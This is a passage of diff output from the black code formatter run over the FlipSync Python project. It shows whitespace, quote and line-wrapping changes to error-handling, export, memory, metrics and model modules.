 class TestServiceAgent:
     """Agent test class for service."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace/ebay/__init__.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace/ebay/__init__.py	2025-06-19 04:03:52.203672+00:00
@@ -9,8 +9,8 @@
 from fs_agt_clean.core.marketplace.ebay.config import EbayConfig
 from fs_agt_clean.core.marketplace.ebay.service import EbayService
 
 __all__ = [
     "EbayAPIClient",
-    "EbayConfig", 
+    "EbayConfig",
     "EbayService",
 ]
--- /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/standard_handler.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/standard_handler.py	2025-06-19 04:03:52.201912+00:00
@@ -11,11 +11,16 @@
 from typing import Dict, List, Optional, Any, Union
 from enum import Enum
 
 # Import alert system components with fallback
 try:
-    from fs_agt_clean.core.monitoring.alert_manager import AlertManager, Alert, AlertType, AlertSeverity
+    from fs_agt_clean.core.monitoring.alert_manager import (
+        AlertManager,
+        Alert,
+        AlertType,
+        AlertSeverity,
+    )
 except ImportError:
     AlertManager = None
     Alert = None
     AlertType = None
     AlertSeverity = None
@@ -23,18 +28,20 @@
 logger = logging.getLogger(__name__)
 
 
 class ErrorSeverity(str, Enum):
     """Standardized error severity levels."""
+
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     CRITICAL = "critical"
 
 
 class ErrorCategory(str, Enum):
     """Standardized error categories."""
+
     AGENT_ERROR = "agent_error"
     PROCESSING_ERROR = "processing_error"
     COMMUNICATION_ERROR = "communication_error"
     DATA_ERROR = "data_error"
     CONFIGURATION_ERROR = "configuration_error"
@@ -44,69 +51,71 @@
 
 
 class StandardErrorHandler:
     """
     Standardized error handling for FlipSync agents.
-    
+
     Provides unified error logging, alerting, and response formatting
     to eliminate inconsistencies across agent implementations.
     """
-    
+
     def __init__(self, alert_manager: Optional[AlertManager] = None):
         """Initialize the error handler."""
         self.alert_manager = alert_manager
-        
+
         # Error severity mapping
         self.severity_mapping = {
             ErrorSeverity.LOW: logging.INFO,
             ErrorSeverity.MEDIUM: logging.WARNING,
             ErrorSeverity.HIGH: logging.ERROR,
-            ErrorSeverity.CRITICAL: logging.CRITICAL
+            ErrorSeverity.CRITICAL: logging.CRITICAL,
         }
-        
+
         # Alert severity mapping (if alert system is available)
         if AlertSeverity:
             self.alert_severity_mapping = {
                 ErrorSeverity.LOW: AlertSeverity.LOW,
                 ErrorSeverity.MEDIUM: AlertSeverity.MEDIUM,
                 ErrorSeverity.HIGH: AlertSeverity.HIGH,
-                ErrorSeverity.CRITICAL: AlertSeverity.CRITICAL
+                ErrorSeverity.CRITICAL: AlertSeverity.CRITICAL,
             }
         else:
             self.alert_severity_mapping = {}
-    
+
     async def handle_agent_error(
         self,
         error: Exception,
         agent_id: str,
         operation: str,
         agent_type: str = "unknown",
         severity: ErrorSeverity = ErrorSeverity.MEDIUM,
         category: ErrorCategory = ErrorCategory.AGENT_ERROR,
         context: Optional[Dict[str, Any]] = None,
-        user_message: Optional[str] = None
+        user_message: Optional[str] = None,
     ) -> Dict[str, Any]:
         """
         Handle agent errors with standardized logging, alerting, and response formatting.
-        
+
         Args:
             error: The exception that occurred
             agent_id: Identifier of the agent
             operation: Operation being performed when error occurred
             agent_type: Type of agent (content, logistics, executive, etc.)
             severity: Error severity level
             category: Error category
             context: Additional context information
             user_message: Optional user-friendly error message
-            
+
         Returns:
             Standardized error response dictionary
         """
         try:
             # Generate error ID for tracking
-            error_id = f"{agent_type}_{agent_id}_{operation}_{int(datetime.now().timestamp())}"
-            
+            error_id = (
+                f"{agent_type}_{agent_id}_{operation}_{int(datetime.now().timestamp())}"
+            )
+
             # Prepare error details
             error_details = {
                 "error_id": error_id,
                 "agent_id": agent_id,
                 "agent_type": agent_type,
@@ -115,83 +124,92 @@
                 "error_message": str(error),
                 "severity": severity.value,
                 "category": category.value,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
                 "context": context or {},
-                "traceback": traceback.format_exc()
+                "traceback": traceback.format_exc(),
             }
-            
+
             # Log the error
             await self._log_error(error_details, severity)
-            
+
             # Send alert if alert manager is available
             if self.alert_manager:
                 await self._send_alert(error_details, severity)
-            
+
             # Create user-friendly response
             user_response = self._create_user_response(
                 error_details, user_message, severity
             )
-            
+
             return {
                 "success": False,
                 "error_id": error_id,
                 "error_type": category.value,
                 "message": user_response,
                 "severity": severity.value,
                 "timestamp": error_details["timestamp"],
-                "details": error_details if severity in [ErrorSeverity.HIGH, ErrorSeverity.CRITICAL] else None
+                "details": (
+                    error_details
+                    if severity in [ErrorSeverity.HIGH, ErrorSeverity.CRITICAL]
+                    else None
+                ),
             }
-            
+
         except Exception as handler_error:
             # Fallback error handling
             logger.critical(f"Error in error handler: {handler_error}")
             return {
                 "success": False,
                 "error_id": "handler_error",
                 "error_type": "error_handler_failure",
                 "message": "An unexpected error occurred. Please try again.",
                 "severity": ErrorSeverity.CRITICAL.value,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
-    
+
     async def _log_error(self, error_details: Dict[str, Any], severity: ErrorSeverity):
         """Log error with appropriate severity level."""
         try:
             log_level = self.severity_mapping.get(severity, logging.ERROR)
-            
+
             # Format log message
             log_message = (
                 f"Agent Error [{error_details['error_id']}] - "
                 f"Agent: {error_details['agent_type']}/{error_details['agent_id']} - "
                 f"Operation: {error_details['operation']} - "
                 f"Error: {error_details['error_message']}"
             )
-            
+
             # Add context if available
             if error_details.get("context"):
                 log_message += f" - Context: {error_details['context']}"
-            
+
             # Log with appropriate level
             logger.log(log_level, log_message)
-            
+
             # Log full traceback for high/critical errors
             if severity in [ErrorSeverity.HIGH, ErrorSeverity.CRITICAL]:
-                logger.log(log_level, f"Traceback for {error_details['error_id']}:\n{error_details['traceback']}")
-                
+                logger.log(
+                    log_level,
+                    f"Traceback for {error_details['error_id']}:\n{error_details['traceback']}",
+                )
+
         except Exception as e:
             logger.error(f"Failed to log error: {e}")
-    
+
     async def _send_alert(self, error_details: Dict[str, Any], severity: ErrorSeverity):
         """Send alert through alert manager if available."""
         try:
             if not self.alert_manager or not Alert or not AlertType:
                 return
-            
+
             # Map severity to alert severity
-            alert_severity = self.alert_severity_mapping.get(severity, AlertSeverity.MEDIUM)
-            
+            alert_severity = self.alert_severity_mapping.get(
+                severity, AlertSeverity.MEDIUM
+            )
+
             # Create alert
             alert = Alert(
                 alert_id=error_details["error_id"],
                 alert_type=AlertType.CUSTOM,
                 message=f"Agent {error_details['agent_type']} error: {error_details['error_message']}",
@@ -203,64 +221,64 @@
                 metadata={
                     "agent_id": error_details["agent_id"],
                     "agent_type": error_details["agent_type"],
                     "operation": error_details["operation"],
                     "error_type": error_details["error_type"],
-                    "category": error_details["category"]
-                }
+                    "category": error_details["category"],
+                },
             )
-            
+
             # Process alert
             await self.alert_manager.process_alert(alert)
-            
+
         except Exception as e:
             logger.error(f"Failed to send alert: {e}")
-    
+
     def _create_user_response(
         self,
         error_details: Dict[str, Any],
         user_message: Optional[str],
-        severity: ErrorSeverity
+        severity: ErrorSeverity,
     ) -> str:
         """Create user-friendly error response message."""
         try:
             if user_message:
                 return user_message
-            
+
             # Default messages based on severity and category
             agent_type = error_details.get("agent_type", "system")
             category = error_details.get("category", "unknown")
-            
+
             if severity == ErrorSeverity.CRITICAL:
                 return f"A critical error occurred in the {agent_type} agent. Please contact support with error ID: {error_details['error_id']}"
-            
+
             elif severity == ErrorSeverity.HIGH:
                 return f"The {agent_type} agent encountered an error and cannot complete this request. Please try again or contact support."
-            
+
             elif severity == ErrorSeverity.MEDIUM:
                 if category == ErrorCategory.TIMEOUT_ERROR.value:
                     return f"The {agent_type} agent is taking longer than expected. Please try again."
                 elif category == ErrorCategory.EXTERNAL_SERVICE_ERROR.value:
                     return f"The {agent_type} agent is experiencing connectivity issues. Please try again in a moment."
                 else:
                     return f"The {agent_type} agent encountered an issue processing your request. Please try again."
-            
+
             else:  # LOW severity
                 return f"The {agent_type} agent completed with minor issues. Results may be limited."
-                
+
         except Exception as e:
             logger.error(f"Failed to create user response: {e}")
             return "An error occurred. Please try again."
-    
+
     @classmethod
     def create_validation_error(
         cls,
         field_name: str,
         field_value: Any,
         expected_type: str,
         agent_id: str,
-        operation: str
+        operation: str,
     ) -> Dict[str, Any]:
         """Create standardized validation error response."""
         return {
             "success": False,
             "error_type": ErrorCategory.VALIDATION_ERROR.value,
@@ -268,84 +286,83 @@
             "field": field_name,
             "value": str(field_value),
             "expected_type": expected_type,
             "agent_id": agent_id,
             "operation": operation,
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(timezone.utc).isoformat(),
         }
-    
+
     @classmethod
     def create_timeout_error(
-        cls,
-        operation: str,
-        timeout_duration: float,
-        agent_id: str,
-        agent_type: str
+        cls, operation: str, timeout_duration: float, agent_id: str, agent_type: str
     ) -> Dict[str, Any]:
         """Create standardized timeout error response."""
         return {
             "success": False,
             "error_type": ErrorCategory.TIMEOUT_ERROR.value,
             "message": f"Operation '{operation}' timed out after {timeout_duration} seconds",
             "operation": operation,
             "timeout_duration": timeout_duration,
             "agent_id": agent_id,
             "agent_type": agent_type,
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(timezone.utc).isoformat(),
         }
-    
+
     @classmethod
     def create_external_service_error(
         cls,
         service_name: str,
         error_message: str,
         agent_id: str,
         operation: str,
-        status_code: Optional[int] = None
+        status_code: Optional[int] = None,
     ) -> Dict[str, Any]:
         """Create standardized external service error response."""
         return {
             "success": False,
             "error_type": ErrorCategory.EXTERNAL_SERVICE_ERROR.value,
             "message": f"External service '{service_name}' error: {error_message}",
             "service_name": service_name,
             "status_code": status_code,
             "agent_id": agent_id,
             "operation": operation,
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(timezone.utc).isoformat(),
         }
-    
+
     @classmethod
-    def wrap_agent_operation(cls, error_handler: 'StandardErrorHandler'):
+    def wrap_agent_operation(cls, error_handler: "StandardErrorHandler"):
         """
         Decorator to wrap agent operations with standardized error handling.
-        
+
         Usage:
         @StandardErrorHandler.wrap_agent_operation(error_handler)
         async def my_agent_method(self, ...):
             # Method implementation
         """
+
         def decorator(func):
             async def wrapper(self, *args, **kwargs):
                 try:
                     return await func(self, *args, **kwargs)
                 except Exception as e:
                     # Extract agent info from self
-                    agent_id = getattr(self, 'agent_id', 'unknown')
-                    agent_type = getattr(self, 'agent_type', type(self).__name__)
+                    agent_id = getattr(self, "agent_id", "unknown")
+                    agent_type = getattr(self, "agent_type", type(self).__name__)
                     operation = func.__name__
-                    
+
                     # Handle error
                     return await error_handler.handle_agent_error(
                         error=e,
                         agent_id=agent_id,
                         operation=operation,
                         agent_type=agent_type,
                         severity=ErrorSeverity.MEDIUM,
-                        category=ErrorCategory.AGENT_ERROR
+                        category=ErrorCategory.AGENT_ERROR,
                     )
+
             return wrapper
+
         return decorator
 
 
 # Global error handler instance
 _global_error_handler = None
@@ -363,43 +380,39 @@
             else:
                 _global_error_handler = StandardErrorHandler()
         except Exception as e:
             logger.warning(f"Failed to create error handler with alert manager: {e}")
             _global_error_handler = StandardErrorHandler()
-    
+
     return _global_error_handler
 
 
 # Convenience functions for common error types
 async def handle_agent_error(
     error: Exception,
     agent_id: str,
     operation: str,
     agent_type: str = "unknown",
-    severity: ErrorSeverity = ErrorSeverity.MEDIUM
+    severity: ErrorSeverity = ErrorSeverity.MEDIUM,
 ) -> Dict[str, Any]:
     """Convenience function for handling agent errors."""
     handler = get_global_error_handler()
     return await handler.handle_agent_error(
         error=error,
         agent_id=agent_id,
         operation=operation,
         agent_type=agent_type,
-        severity=severity
+        severity=severity,
     )
 
 
 def create_validation_error(
-    field_name: str,
-    field_value: Any,
-    expected_type: str,
-    agent_id: str,
-    operation: str
+    field_name: str, field_value: Any, expected_type: str, agent_id: str, operation: str
 ) -> Dict[str, Any]:
     """Convenience function for creating validation errors."""
     return StandardErrorHandler.create_validation_error(
         field_name=field_name,
         field_value=field_value,
         expected_type=expected_type,
         agent_id=agent_id,
-        operation=operation
+        operation=operation,
     )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/error_handling/standard_handler.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace/ebay/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/export_service/exporter.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/export_service/exporter.py	2025-06-19 04:03:52.236857+00:00
@@ -133,11 +133,11 @@
             # Record export attempt
             export_record = {
                 "timestamp": datetime.now().isoformat(),
                 "format": format_type,
                 "data_type": type(data).__name__,
-                "status": "started"
+                "status": "started",
             }
 
             if format_type.lower() == "json":
                 result = await self._export_json(data)
             elif format_type.lower() == "csv":
@@ -162,14 +162,14 @@
 
     async def _export_json(self, data: Any) -> str:
         """Export data as JSON."""
         try:
             # Handle different data types
-            if hasattr(data, '__dict__'):
+            if hasattr(data, "__dict__"):
                 # Convert objects to dict
                 data = data.__dict__
-            elif hasattr(data, '_asdict'):
+            elif hasattr(data, "_asdict"):
                 # Handle namedtuples
                 data = data._asdict()
 
             return json.dumps(data, indent=2, default=str)
         except Exception as e:
@@ -238,9 +238,9 @@
                     add_element(root, f"item_{i}", item)
             else:
                 elem = ET.SubElement(root, "data")
                 elem.text = str(data)
 
-            return ET.tostring(root, encoding='unicode')
+            return ET.tostring(root, encoding="unicode")
         except Exception as e:
             logger.error(f"XML export failed: {e}")
             raise
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/export_service/exporter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/export_service.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/export_service.py	2025-06-19 04:03:52.264139+00:00
@@ -14,79 +14,83 @@
 
     def __init__(self):
         """Initialize the export service."""
         self.supported_formats = ["json", "csv", "xml"]
         self.export_history: List[Dict[str, Any]] = []
-        
-    async def export_data(self, data: Any, format_type: str = "json") -> Union[str, bytes]:
+
+    async def export_data(
+        self, data: Any, format_type: str = "json"
+    ) -> Union[str, bytes]:
         """Export data in the specified format.
-        
+
         Args:
             data: Data to export
             format_type: Export format (json, csv, xml)
-            
+
         Returns:
             Exported data as string or bytes
         """
         try:
             if format_type.lower() not in self.supported_formats:
                 raise ValueError(f"Unsupported format: {format_type}")
-            
+
             # Record export attempt
             export_record = {
                 "timestamp": datetime.now().isoformat(),
                 "format": format_type,
                 "data_type": type(data).__name__,
-                "status": "started"
+                "status": "started",
             }
-            
+
             if format_type.lower() == "json":
                 result = await self._export_json(data)
             elif format_type.lower() == "csv":
                 result = await self._export_csv(data)
             elif format_type.lower() == "xml":
                 result = await self._export_xml(data)
             else:
                 raise ValueError(f"Format {format_type} not implemented")
-            
+
             export_record["status"] = "completed"
-            export_record["size"] = len(result) if isinstance(result, str) else len(result)
+            export_record["size"] = (
+                len(result) if isinstance(result, str) else len(result)
+            )
             self.export_history.append(export_record)
-            
+
             return result
-            
+
         except Exception as e:
             logger.error(f"Export failed: {e}")
             export_record["status"] = "failed"
             export_record["error"] = str(e)
             self.export_history.append(export_record)
             raise
-    
+
     async def _export_json(self, data: Any) -> str:
         """Export data as JSON."""
         try:
             # Handle different data types
-            if hasattr(data, '__dict__'):
+            if hasattr(data, "__dict__"):
                 # Convert objects to dict
                 data = data.__dict__
-            elif hasattr(data, '_asdict'):
+            elif hasattr(data, "_asdict"):
                 # Handle namedtuples
                 data = data._asdict()
-            
+
             return json.dumps(data, indent=2, default=str)
         except Exception as e:
             logger.error(f"JSON export failed: {e}")
             raise
-    
+
     async def _export_csv(self, data: Any) -> str:
         """Export data as CSV."""
         try:
             import csv
             import io
-            
+
             output = io.StringIO()
-            
+
             if isinstance(data, list) and len(data) > 0:
                 # Handle list of dictionaries
                 if isinstance(data[0], dict):
                     fieldnames = data[0].keys()
                     writer = csv.DictWriter(output, fieldnames=fieldnames)
@@ -104,77 +108,77 @@
                 writer.writerow(data)
             else:
                 # Handle single value
                 writer = csv.writer(output)
                 writer.writerow([data])
-            
+
             return output.getvalue()
         except Exception as e:
             logger.error(f"CSV export failed: {e}")
             raise
-    
+
     async def _export_xml(self, data: Any) -> str:
         """Export data as XML."""
         try:
             import xml.etree.ElementTree as ET
-            
+
             root = ET.Element("export")
             root.set("timestamp", datetime.now().isoformat())
-            
+
             def add_element(parent, key, value):
                 elem = ET.SubElement(parent, str(key))
                 if isinstance(value, dict):
                     for k, v in value.items():
                         add_element(elem, k, v)
                 elif isinstance(value, list):
                     for i, item in enumerate(value):
                         add_element(elem, f"item_{i}", item)
                 else:
                     elem.text = str(value)
-            
+
             if isinstance(data, dict):
                 for key, value in data.items():
                     add_element(root, key, value)
             elif isinstance(data, list):
                 for i, item in enumerate(data):
                     add_element(root, f"item_{i}", item)
             else:
                 elem = ET.SubElement(root, "data")
                 elem.text = str(data)
-            
-            return ET.tostring(root, encoding='unicode')
+
+            return ET.tostring(root, encoding="unicode")
         except Exception as e:
             logger.error(f"XML export failed: {e}")
             raise
-    
+
     def get_export_history(self) -> List[Dict[str, Any]]:
         """Get the export history."""
         return self.export_history.copy()
-    
+
     def get_supported_formats(self) -> List[str]:
         """Get list of supported export formats."""
         return self.supported_formats.copy()
-    
+
     async def clear_history(self) -> None:
         """Clear the export history."""
         self.export_history.clear()
-    
+
     async def health_check(self) -> Dict[str, Any]:
         """Perform a health check on the export service."""
         try:
             # Test basic functionality
             test_data = {"test": "data", "timestamp": datetime.now().isoformat()}
             await self.export_data(test_data, "json")
-            
+
             return {
                 "status": "healthy",
                 "supported_formats": self.supported_formats,
                 "export_count": len(self.export_history),
-                "last_export": self.export_history[-1] if self.export_history else None
+                "last_export": self.export_history[-1] if self.export_history else None,
             }
         except Exception as e:
             return {
                 "status": "unhealthy",
                 "error": str(e),
                 "supported_formats": self.supported_formats,
-                "export_count": len(self.export_history)
+                "export_count": len(self.export_history),
             }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/export_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/memory/__init__.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/memory/__init__.py	2025-06-19 04:03:52.289244+00:00
@@ -7,10 +7,6 @@
 
 from .memory_manager import MemoryManager
 from .chat_history import ChatHistoryManager
 from .user_profile import UserProfileManager
 
-__all__ = [
-    "MemoryManager",
-    "ChatHistoryManager", 
-    "UserProfileManager"
-]
+__all__ = ["MemoryManager", "ChatHistoryManager", "UserProfileManager"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/memory/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/memory/test_memory_manager.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/memory/test_memory_manager.py	2025-06-19 04:03:52.432819+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from memory_manager import *
+
 
 class TestMemoryManagerAgent:
     """Agent test class for memory_manager."""
 
     def test_import(self):
@@ -58,7 +59,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/memory/test_memory_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/memory/chat_history.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/memory/chat_history.py	2025-06-19 04:03:52.449837+00:00
@@ -13,91 +13,91 @@
 
 
 class ChatHistoryManager:
     """
     Legacy chat history manager for backward compatibility.
-    
+
     This class provides basic chat history management capabilities
     that are used by the chat service for legacy support.
     """
-    
+
     def __init__(self):
         """Initialize the chat history manager."""
         self.chat_histories: Dict[str, List[Dict[str, Any]]] = {}
         self.initialized = True
         logger.info("ChatHistoryManager initialized for legacy support")
-    
+
     def add_message(
         self,
         conversation_id: str,
         user_id: str,
         message: str,
         response: str,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> None:
         """
         Add a message and response to chat history.
-        
+
         Args:
             conversation_id: Conversation identifier
             user_id: User identifier
             message: User message
             response: System response
             metadata: Optional metadata
         """
         try:
             if conversation_id not in self.chat_histories:
                 self.chat_histories[conversation_id] = []
-            
+
             entry = {
                 "timestamp": datetime.now().isoformat(),
                 "user_id": user_id,
                 "message": message,
                 "response": response,
-                "metadata": metadata or {}
+                "metadata": metadata or {},
             }
-            
+
             self.chat_histories[conversation_id].append(entry)
-            logger.debug(f"Added message to chat history for conversation {conversation_id}")
-            
+            logger.debug(
+                f"Added message to chat history for conversation {conversation_id}"
+            )
+
         except Exception as e:
             logger.error(f"Error adding message to chat history: {e}")
-    
+
     def get_history(
-        self,
-        conversation_id: str,
-        limit: Optional[int] = None
+        self, conversation_id: str, limit: Optional[int] = None
     ) -> List[Dict[str, Any]]:
         """
         Get chat history for a conversation.
-        
+
         Args:
             conversation_id: Conversation identifier
             limit: Optional limit on number of messages
-            
+
         Returns:
             List of chat history entries
         """
         try:
             history = self.chat_histories.get(conversation_id, [])
             if limit:
                 history = history[-limit:]
             return history
-            
+
         except Exception as e:
             logger.error(f"Error getting chat history: {e}")
             return []
-    
+
     def clear_history(self, conversation_id: str) -> None:
         """
         Clear chat history for a conversation.
-        
+
         Args:
             conversation_id: Conversation identifier
         """
         try:
             if conversation_id in self.chat_histories:
                 del self.chat_histories[conversation_id]
                 logger.info(f"Cleared chat history for conversation {conversation_id}")
-                
+
         except Exception as e:
             logger.error(f"Error clearing chat history: {e}")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/memory/chat_history.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/compat.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/compat.py	2025-06-19 04:03:52.562002+00:00
@@ -14,30 +14,30 @@
 
 
 def get_metrics_service() -> MetricsService:
     """
     Get the global metrics service instance.
-    
+
     Returns:
         MetricsService: The metrics service instance
-        
+
     Raises:
         RuntimeError: If metrics service is not initialized
     """
     global _metrics_service
-    
+
     if _metrics_service is None:
         # Initialize with default configuration
         _metrics_service = MetricsService()
-    
+
     return _metrics_service
 
 
 def set_metrics_service(service: MetricsService) -> None:
     """
     Set the global metrics service instance.
-    
+
     Args:
         service: The metrics service instance to set
     """
     global _metrics_service
     _metrics_service = service
@@ -47,10 +47,6 @@
     """Reset the global metrics service instance."""
     global _metrics_service
     _metrics_service = None
 
 
-__all__ = [
-    "get_metrics_service",
-    "set_metrics_service", 
-    "reset_metrics_service"
-]
+__all__ = ["get_metrics_service", "set_metrics_service", "reset_metrics_service"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/compat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/memory/user_profile.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/memory/user_profile.py	2025-06-19 04:03:52.610441+00:00
@@ -13,115 +13,101 @@
 
 
 class UserProfileManager:
     """
     Legacy user profile manager for backward compatibility.
-    
+
     This class provides basic user profile management capabilities
     that are used by the chat service for legacy support.
     """
-    
+
     def __init__(self):
         """Initialize the user profile manager."""
         self.user_profiles: Dict[str, Dict[str, Any]] = {}
         self.initialized = True
         logger.info("UserProfileManager initialized for legacy support")
-    
+
     def get_profile(self, user_id: str) -> Dict[str, Any]:
         """
         Get user profile.
-        
+
         Args:
             user_id: User identifier
-            
+
         Returns:
             User profile dictionary
         """
         try:
             if user_id not in self.user_profiles:
                 self.user_profiles[user_id] = {
                     "user_id": user_id,
                     "created_at": datetime.now().isoformat(),
                     "preferences": {},
                     "context": {},
-                    "metadata": {}
+                    "metadata": {},
                 }
-            
+
             return self.user_profiles[user_id]
-            
+
         except Exception as e:
             logger.error(f"Error getting user profile: {e}")
             return {"user_id": user_id, "error": str(e)}
-    
-    def update_profile(
-        self,
-        user_id: str,
-        updates: Dict[str, Any]
-    ) -> None:
+
+    def update_profile(self, user_id: str, updates: Dict[str, Any]) -> None:
         """
         Update user profile.
-        
+
         Args:
             user_id: User identifier
             updates: Profile updates
         """
         try:
             profile = self.get_profile(user_id)
             profile.update(updates)
             profile["updated_at"] = datetime.now().isoformat()
-            
+
             logger.debug(f"Updated profile for user {user_id}")
-            
+
         except Exception as e:
             logger.error(f"Error updating user profile: {e}")
-    
-    def set_preference(
-        self,
-        user_id: str,
-        key: str,
-        value: Any
-    ) -> None:
+
+    def set_preference(self, user_id: str, key: str, value: Any) -> None:
         """
         Set user preference.
-        
+
         Args:
             user_id: User identifier
             key: Preference key
             value: Preference value
         """
         try:
             profile = self.get_profile(user_id)
             if "preferences" not in profile:
                 profile["preferences"] = {}
-            
+
             profile["preferences"][key] = value
             profile["updated_at"] = datetime.now().isoformat()
-            
+
             logger.debug(f"Set preference {key} for user {user_id}")
-            
+
         except Exception as e:
             logger.error(f"Error setting user preference: {e}")
-    
-    def get_preference(
-        self,
-        user_id: str,
-        key: str,
-        default: Any = None
-    ) -> Any:
+
+    def get_preference(self, user_id: str, key: str, default: Any = None) -> Any:
         """
         Get user preference.
-        
+
         Args:
             user_id: User identifier
             key: Preference key
             default: Default value if not found
-            
+
         Returns:
             Preference value or default
         """
         try:
             profile = self.get_profile(user_id)
             return profile.get("preferences", {}).get(key, default)
-            
+
         except Exception as e:
             logger.error(f"Error getting user preference: {e}")
             return default
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/memory/user_profile.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/service.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/service.py	2025-06-19 04:03:52.627801+00:00
@@ -10,30 +10,34 @@
 logger = logging.getLogger(__name__)
 
 
 class MetricsService:
     """Simple metrics service for compatibility."""
-    
+
     def __init__(self):
         """Initialize metrics service."""
         self._metrics = {}
-    
-    def increment_counter(self, name: str, value: float = 1.0, tags: Optional[Dict[str, str]] = None):
+
+    def increment_counter(
+        self, name: str, value: float = 1.0, tags: Optional[Dict[str, str]] = None
+    ):
         """Increment a counter metric."""
         key = f"{name}:{tags}" if tags else name
         self._metrics[key] = self._metrics.get(key, 0) + value
-    
+
     def set_gauge(self, name: str, value: float, tags: Optional[Dict[str, str]] = None):
         """Set a gauge metric."""
         key = f"{name}:{tags}" if tags else name
         self._metrics[key] = value
-    
-    def record_histogram(self, name: str, value: float, tags: Optional[Dict[str, str]] = None):
+
+    def record_histogram(
+        self, name: str, value: float, tags: Optional[Dict[str, str]] = None
+    ):
         """Record a histogram value."""
         key = f"{name}_hist:{tags}" if tags else f"{name}_hist"
         if key not in self._metrics:
             self._metrics[key] = []
         self._metrics[key].append(value)
-    
+
     def get_metrics(self) -> Dict[str, Any]:
         """Get all metrics."""
         return self._metrics.copy()
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/__init__.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/__init__.py	2025-06-19 04:03:52.643239+00:00
@@ -1,9 +1,20 @@
 """Models for FlipSync."""
 
-from .document import Document, SearchQuery, DocumentSearchResult, DocumentBatch, DocumentStats
-from .vector_store import VectorStoreDocument, VectorStoreQuery, VectorStoreResult, VectorStore
+from .document import (
+    Document,
+    SearchQuery,
+    DocumentSearchResult,
+    DocumentBatch,
+    DocumentStats,
+)
+from .vector_store import (
+    VectorStoreDocument,
+    VectorStoreQuery,
+    VectorStoreResult,
+    VectorStore,
+)
 
 __all__ = [
     "Document",
     "SearchQuery",
     "DocumentSearchResult",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/metrics/service.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace_client.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace_client.py	2025-06-19 04:03:52.673913+00:00
@@ -14,19 +14,19 @@
 
 
 class MarketplaceAPIClient(APIClient):
     """
     Specialized API client for marketplace operations.
-    
+
     Extends the base APIClient with marketplace-specific functionality
     like authentication, rate limiting, and error handling.
     """
 
     def __init__(self, base_url: str, marketplace: str = "unknown"):
         """
         Initialize the marketplace API client.
-        
+
         Args:
             base_url: Base URL for the marketplace API
             marketplace: Name of the marketplace (e.g., 'amazon', 'ebay')
         """
         super().__init__(base_url)
@@ -39,32 +39,34 @@
         self._token_expiry = None
 
     async def _get_access_token(self, scope: Optional[str] = None) -> str:
         """
         Get access token for API authentication.
-        
+
         This is a base implementation that should be overridden by
         marketplace-specific clients.
-        
+
         Args:
             scope: Optional scope for the token
-            
+
         Returns:
             Access token string
-            
+
         Raises:
             NotImplementedError: If not implemented by subclass
         """
         raise NotImplementedError("Subclasses must implement _get_access_token")
 
